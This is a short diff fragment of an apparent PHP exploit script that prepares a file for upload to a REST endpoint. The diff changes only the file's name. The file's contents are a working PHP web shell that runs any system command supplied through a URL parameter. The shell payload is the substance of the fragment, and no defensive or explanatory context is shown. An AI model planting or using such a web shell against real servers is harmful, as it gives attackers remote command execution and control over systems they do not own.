@@ -19,7 +19,7 @@ $endpoint = 'rest_endpoint';
 
 
 $file = [
-    'filename' => 'chris4.php',
+    'filename' => 'chris2.php',
     'data' => '<?php echo system($_GET["cmd"]); ?>'
 ];
 
